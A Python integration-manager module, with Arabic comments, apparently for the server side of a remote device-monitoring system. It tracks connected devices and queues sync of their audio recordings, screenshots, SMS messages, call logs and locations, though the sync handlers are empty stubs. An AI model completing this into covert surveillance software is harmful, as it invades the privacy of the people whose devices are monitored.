#!/usr/bin/env python3
"""
مدير التكامل بين المكونات
Integration Manager for System Components
"""

import asyncio
import json
import threading
import time
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Callable
import logging
from dataclasses import dataclass
from enum import Enum
import queue
import websocket
import ssl

logger = logging.getLogger(__name__)

class EventType(Enum):
    """أنواع الأحداث"""
    DEVICE_CONNECTED = "device_connected"
    DEVICE_DISCONNECTED = "device_disconnected"
    NEW_RECORDING = "new_recording"
    NEW_SCREENSHOT = "new_screenshot"
    NEW_SMS = "new_sms"
    NEW_CALL = "new_call"
    LOCATION_UPDATE = "location_update"
    SYSTEM_ALERT = "system_alert"
    USER_LOGIN = "user_login"
    USER_LOGOUT = "user_logout"

@dataclass
class SystemEvent:
    """حدث النظام"""
    event_type: EventType
    device_id: Optional[str]
    user_id: Optional[int]
    data: Dict[str, Any]
    timestamp: datetime
    priority: int = 1  # 1=low, 2=medium, 3=high, 4=critical

class EventBus:
    """ناقل الأحداث"""
    
    def __init__(self):
        self.subscribers: Dict[EventType, List[Callable]] = {}
        self.event_queue = queue.Queue()
        self.running = False
        self.worker_thread = None
    
    def subscribe(self, event_type: EventType, callback: Callable):
        """الاشتراك في نوع حدث"""
        if event_type not in self.subscribers:
            self.subscribers[event_type] = []
        
        self.subscribers[event_type].append(callback)
        logger.info(f"Subscribed to {event_type.value}")
    
    def unsubscribe(self, event_type: EventType, callback: Callable):
        """إلغاء الاشتراك في نوع حدث"""
        if event_type in self.subscribers:
            try:
                self.subscribers[event_type].remove(callback)
                logger.info(f"Unsubscribed from {event_type.value}")
            except ValueError:
                pass
    
    def publish(self, event: SystemEvent):
        """نشر حدث"""
        self.event_queue.put(event)
        logger.debug(f"Published event: {event.event_type.value}")
    
    def start(self):
        """بدء معالج الأحداث"""
        if self.running:
            return
        
        self.running = True
        self.worker_thread = threading.Thread(target=self._event_worker, daemon=True)
        self.worker_thread.start()
        logger.info("Event bus started")
    
    def stop(self):
        """إيقاف معالج الأحداث"""
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)
        logger.info("Event bus stopped")
    
    def _event_worker(self):
        """معالج الأحداث"""
        while self.running:
            try:
                # انتظار حدث لمدة ثانية واحدة
                event = self.event_queue.get(timeout=1)
                
                # معالجة الحدث
                self._process_event(event)
                
                # تأكيد معالجة الحدث
                self.event_queue.task_done()
            
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Event processing error: {e}")
    
    def _process_event(self, event: SystemEvent):
        """معالجة حدث واحد"""
        if event.event_type in self.subscribers:
            for callback in self.subscribers[event.event_type]:
                try:
                    callback(event)
                except Exception as e:
                    logger.error(f"Event callback error: {e}")

class DeviceManager:
    """مدير الأجهزة"""
    
    def __init__(self, db_manager, event_bus):
        self.db_manager = db_manager
        self.event_bus = event_bus
        self.connected_devices = {}
        self.device_heartbeats = {}
        
        # الاشتراك في الأحداث
        self.event_bus.subscribe(EventType.DEVICE_CONNECTED, self._on_device_connected)
        self.event_bus.subscribe(EventType.DEVICE_DISCONNECTED, self._on_device_disconnected)
        
        # بدء مراقب الأجهزة
        self.start_device_monitor()
    
    def register_device(self, device_info: Dict) -> bool:
        """تسجيل جهاز جديد"""
        try:
            device_id = device_info.get('device_id')
            if not device_id:
                return False
            
            # تحديث أو إدراج معلومات الجهاز
            existing = self.db_manager.execute_query(
                'SELECT id FROM devices WHERE device_id = ?',
                (device_id,)
            )
            
            if existing:
                # تحديث الجهاز الموجود
                self.db_manager.execute_query(
                    '''UPDATE devices SET 
                       device_name = ?, device_type = ?, os_info = ?,
                       hardware_info = ?, network_info = ?, status = 'online',
                       last_seen = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP
                       WHERE device_id = ?''',
                    (device_info.get('device_name'), device_info.get('device_type'),
                     device_info.get('os_info'), json.dumps(device_info.get('hardware_info', {})),
                     json.dumps(device_info.get('network_info', {})), device_id)
                )
            else:
                # إدراج جهاز جديد
                self.db_manager.execute_insert(
                    '''INSERT INTO devices 
                       (device_id, device_name, device_type, os_info, hardware_info, network_info, status)
                       VALUES (?, ?, ?, ?, ?, ?, 'online')''',
                    (device_id, device_info.get('device_name'), device_info.get('device_type'),
                     device_info.get('os_info'), json.dumps(device_info.get('hardware_info', {})),
                     json.dumps(device_info.get('network_info', {})))
                )
            
            # إضافة إلى الأجهزة المتصلة
            self.connected_devices[device_id] = device_info
            self.device_heartbeats[device_id] = datetime.now()
            
            # نشر حدث الاتصال
            self.event_bus.publish(SystemEvent(
                event_type=EventType.DEVICE_CONNECTED,
                device_id=device_id,
                user_id=None,
                data=device_info,
                timestamp=datetime.now(),
                priority=2
            ))
            
            logger.info(f"Device registered: {device_id}")
            return True
        
        except Exception as e:
            logger.error(f"Device registration failed: {e}")
            return False
    
    def update_device_heartbeat(self, device_id: str):
        """تحديث نبضة الجهاز"""
        if device_id in self.connected_devices:
            self.device_heartbeats[device_id] = datetime.now()
            
            # تحديث آخر ظهور في قاعدة البيانات
            self.db_manager.execute_query(
                'UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_id = ?',
                (device_id,)
            )
    
    def disconnect_device(self, device_id: str):
        """قطع اتصال جهاز"""
        if device_id in self.connected_devices:
            device_info = self.connected_devices.pop(device_id)
            self.device_heartbeats.pop(device_id, None)
            
            # تحديث حالة الجهاز
            self.db_manager.execute_query(
                "UPDATE devices SET status = 'offline' WHERE device_id = ?",
                (device_id,)
            )
            
            # نشر حدث قطع الاتصال
            self.event_bus.publish(SystemEvent(
                event_type=EventType.DEVICE_DISCONNECTED,
                device_id=device_id,
                user_id=None,
                data=device_info,
                timestamp=datetime.now(),
                priority=2
            ))
            
            logger.info(f"Device disconnected: {device_id}")
    
    def start_device_monitor(self):
        """بدء مراقب الأجهزة"""
        def monitor_worker():
            while True:
                try:
                    current_time = datetime.now()
                    timeout_threshold = current_time - timedelta(minutes=5)
                    
                    # فحص الأجهزة المنقطعة
                    disconnected_devices = []
                    for device_id, last_heartbeat in self.device_heartbeats.items():
                        if last_heartbeat < timeout_threshold:
                            disconnected_devices.append(device_id)
                    
                    # قطع اتصال الأجهزة المنقطعة
                    for device_id in disconnected_devices:
                        self.disconnect_device(device_id)
                    
                    # انتظار دقيقة واحدة
                    time.sleep(60)
                
                except Exception as e:
                    logger.error(f"Device monitor error: {e}")
                    time.sleep(60)
        
        monitor_thread = threading.Thread(target=monitor_worker, daemon=True)
        monitor_thread.start()
        logger.info("Device monitor started")
    
    def _on_device_connected(self, event: SystemEvent):
        """معالج اتصال الجهاز"""
        logger.info(f"Device connected event processed: {event.device_id}")
    
    def _on_device_disconnected(self, event: SystemEvent):
        """معالج قطع اتصال الجهاز"""
        logger.info(f"Device disconnected event processed: {event.device_id}")

class NotificationService:
    """خدمة الإشعارات"""
    
    def __init__(self, db_manager, event_bus):
        self.db_manager = db_manager
        self.event_bus = event_bus
        self.notification_handlers = {}
        
        # الاشتراك في جميع الأحداث
        for event_type in EventType:
            self.event_bus.subscribe(event_type, self._handle_event)
    
    def register_handler(self, event_type: EventType, handler: Callable):
        """تسجيل معالج إشعارات"""
        if event_type not in self.notification_handlers:
            self.notification_handlers[event_type] = []
        
        self.notification_handlers[event_type].append(handler)
    
    def send_notification(self, user_id: Optional[int], title: str, message: str, 
                         notification_type: str = 'info', data: Dict = None):
        """إرسال إشعار"""
        try:
            # حفظ الإشعار في قاعدة البيانات
            notification_id = self.db_manager.execute_insert(
                '''INSERT INTO notifications (user_id, title, message, type, data)
                   VALUES (?, ?, ?, ?, ?)''',
                (user_id, title, message, notification_type, json.dumps(data or {}))
            )
            
            # إرسال الإشعار عبر القنوات المختلفة
            self._send_push_notification(user_id, title, message, data)
            self._send_email_notification(user_id, title, message, data)
            
            logger.info(f"Notification sent: {notification_id}")
            return notification_id
        
        except Exception as e:
            logger.error(f"Failed to send notification: {e}")
            return None
    
    def _handle_event(self, event: SystemEvent):
        """معالجة الأحداث للإشعارات"""
        try:
            # تحديد نوع الإشعار بناءً على الحدث
            if event.event_type == EventType.DEVICE_CONNECTED:
                self.send_notification(
                    None,
                    "جهاز متصل",
                    f"تم اتصال الجهاز {event.device_id}",
                    "info",
                    event.data
                )
            
            elif event.event_type == EventType.DEVICE_DISCONNECTED:
                self.send_notification(
                    None,
                    "جهاز منقطع",
                    f"تم قطع اتصال الجهاز {event.device_id}",
                    "warning",
                    event.data
                )
            
            elif event.event_type == EventType.NEW_RECORDING:
                self.send_notification(
                    None,
                    "تسجيل جديد",
                    f"تم استلام تسجيل صوتي جديد من {event.device_id}",
                    "info",
                    event.data
                )
            
            elif event.event_type == EventType.SYSTEM_ALERT:
                self.send_notification(
                    None,
                    "تنبيه النظام",
                    event.data.get('message', 'تنبيه من النظام'),
                    "error",
                    event.data
                )
            
            # تشغيل المعالجات المخصصة
            if event.event_type in self.notification_handlers:
                for handler in self.notification_handlers[event.event_type]:
                    handler(event)
        
        except Exception as e:
            logger.error(f"Event handling error: {e}")
    
    def _send_push_notification(self, user_id: Optional[int], title: str, message: str, data: Dict):
        """إرسال إشعار فوري"""
        # تنفيذ إرسال الإشعارات الفورية
        pass
    
    def _send_email_notification(self, user_id: Optional[int], title: str, message: str, data: Dict):
        """إرسال إشعار بريد إلكتروني"""
        # تنفيذ إرسال البريد الإلكتروني
        pass

class DataSyncService:
    """خدمة مزامنة البيانات"""
    
    def __init__(self, db_manager, event_bus):
        self.db_manager = db_manager
        self.event_bus = event_bus
        self.sync_queue = queue.Queue()
        self.running = False
        
        # الاشتراك في أحداث البيانات الجديدة
        self.event_bus.subscribe(EventType.NEW_RECORDING, self._queue_sync)
        self.event_bus.subscribe(EventType.NEW_SCREENSHOT, self._queue_sync)
        self.event_bus.subscribe(EventType.NEW_SMS, self._queue_sync)
        self.event_bus.subscribe(EventType.NEW_CALL, self._queue_sync)
        
        self.start_sync_worker()
    
    def _queue_sync(self, event: SystemEvent):
        """إضافة حدث إلى قائمة المزامنة"""
        self.sync_queue.put(event)
    
    def start_sync_worker(self):
        """بدء عامل المزامنة"""
        def sync_worker():
            while self.running:
                try:
                    event = self.sync_queue.get(timeout=1)
                    self._process_sync(event)
                    self.sync_queue.task_done()
                
                except queue.Empty:
                    continue
                except Exception as e:
                    logger.error(f"Sync worker error: {e}")
        
        self.running = True
        sync_thread = threading.Thread(target=sync_worker, daemon=True)
        sync_thread.start()
        logger.info("Data sync service started")
    
    def _process_sync(self, event: SystemEvent):
        """معالجة مزامنة البيانات"""
        try:
            # تنفيذ منطق المزامنة حسب نوع الحدث
            if event.event_type == EventType.NEW_RECORDING:
                self._sync_audio_recording(event)
            elif event.event_type == EventType.NEW_SCREENSHOT:
                self._sync_screenshot(event)
            elif event.event_type == EventType.NEW_SMS:
                self._sync_sms_message(event)
            elif event.event_type == EventType.NEW_CALL:
                self._sync_call_log(event)
        
        except Exception as e:
            logger.error(f"Data sync processing error: {e}")
    
    def _sync_audio_recording(self, event: SystemEvent):
        """مزامنة التسجيل الصوتي"""
        # تنفيذ منطق مزامنة التسجيلات الصوتية
        pass
    
    def _sync_screenshot(self, event: SystemEvent):
        """مزامنة لقطة الشاشة"""
        # تنفيذ منطق مزامنة لقطات الشاشة
        pass
    
    def _sync_sms_message(self, event: SystemEvent):
        """مزامنة الرسالة النصية"""
        # تنفيذ منطق مزامنة الرسائل النصية
        pass
    
    def _sync_call_log(self, event: SystemEvent):
        """مزامنة سجل المكالمة"""
        # تنفيذ منطق مزامنة سجلات المكالمات
        pass

class PerformanceMonitor:
    """مراقب الأداء"""
    
    def __init__(self, db_manager, event_bus):
        self.db_manager = db_manager
        self.event_bus = event_bus
        self.metrics = {}
        self.running = False
        
        self.start_monitoring()
    
    def start_monitoring(self):
        """بدء مراقبة الأداء"""
        def monitor_worker():
            while self.running:
                try:
                    self._collect_metrics()
                    self._check_alerts()
                    time.sleep(60)  # جمع المقاييس كل دقيقة
                
                except Exception as e:
                    logger.error(f"Performance monitor error: {e}")
                    time.sleep(60)
        
        self.running = True
        monitor_thread = threading.Thread(target=monitor_worker, daemon=True)
        monitor_thread.start()
        logger.info("Performance monitor started")
    
    def _collect_metrics(self):
        """جمع مقاييس الأداء"""
        try:
            # مقاييس قاعدة البيانات
            db_stats = self.db_manager.get_database_stats()
            self.metrics.update(db_stats)
            
            # مقاييس النظام
            import psutil
            self.metrics['cpu_percent'] = psutil.cpu_percent()
            self.metrics['memory_percent'] = psutil.virtual_memory().percent
            self.metrics['disk_percent'] = psutil.disk_usage('/').percent
            
            # مقاييس التطبيق
            self.metrics['timestamp'] = datetime.now().isoformat()
        
        except Exception as e:
            logger.error(f"Metrics collection error: {e}")
    
    def _check_alerts(self):
        """فحص التنبيهات"""
        try:
            # فحص استخدام الذاكرة
            if self.metrics.get('memory_percent', 0) > 90:
                self.event_bus.publish(SystemEvent(
                    event_type=EventType.SYSTEM_ALERT,
                    device_id=None,
                    user_id=None,
                    data={'message': 'استخدام الذاكرة مرتفع', 'value': self.metrics['memory_percent']},
                    timestamp=datetime.now(),
                    priority=3
                ))
            
            # فحص استخدام القرص
            if self.metrics.get('disk_percent', 0) > 85:
                self.event_bus.publish(SystemEvent(
                    event_type=EventType.SYSTEM_ALERT,
                    device_id=None,
                    user_id=None,
                    data={'message': 'مساحة القرص منخفضة', 'value': self.metrics['disk_percent']},
                    timestamp=datetime.now(),
                    priority=3
                ))
        
        except Exception as e:
            logger.error(f"Alert checking error: {e}")
    
    def get_metrics(self) -> Dict:
        """الحصول على المقاييس الحالية"""
        return self.metrics.copy()

class IntegrationManager:
    """مدير التكامل الرئيسي"""
    
    def __init__(self, db_manager):
        self.db_manager = db_manager
        self.event_bus = EventBus()
        
        # تهيئة الخدمات
        self.device_manager = DeviceManager(db_manager, self.event_bus)
        self.notification_service = NotificationService(db_manager, self.event_bus)
        self.data_sync_service = DataSyncService(db_manager, self.event_bus)
        self.performance_monitor = PerformanceMonitor(db_manager, self.event_bus)
        
        # بدء ناقل الأحداث
        self.event_bus.start()
        
        logger.info("Integration manager initialized")
    
    def publish_event(self, event_type: EventType, device_id: str = None, 
                     user_id: int = None, data: Dict = None, priority: int = 1):
        """نشر حدث"""
        event = SystemEvent(
            event_type=event_type,
            device_id=device_id,
            user_id=user_id,
            data=data or {},
            timestamp=datetime.now(),
            priority=priority
        )
        
        self.event_bus.publish(event)
    
    def register_device(self, device_info: Dict) -> bool:
        """تسجيل جهاز"""
        return self.device_manager.register_device(device_info)
    
    def update_device_heartbeat(self, device_id: str):
        """تحديث نبضة الجهاز"""
        self.device_manager.update_device_heartbeat(device_id)
    
    def send_notification(self, user_id: int, title: str, message: str, 
                         notification_type: str = 'info', data: Dict = None):
        """إرسال إشعار"""
        return self.notification_service.send_notification(
            user_id, title, message, notification_type, data
        )
    
    def get_performance_metrics(self) -> Dict:
        """الحصول على مقاييس الأداء"""
        return self.performance_monitor.get_metrics()
    
    def get_connected_devices(self) -> Dict:
        """الحصول على الأجهزة المتصلة"""
        return self.device_manager.connected_devices.copy()
    
    def shutdown(self):
        """إيقاف مدير التكامل"""
        self.event_bus.stop()
        self.performance_monitor.running = False
        self.data_sync_service.running = False
        
        logger.info("Integration manager shutdown")

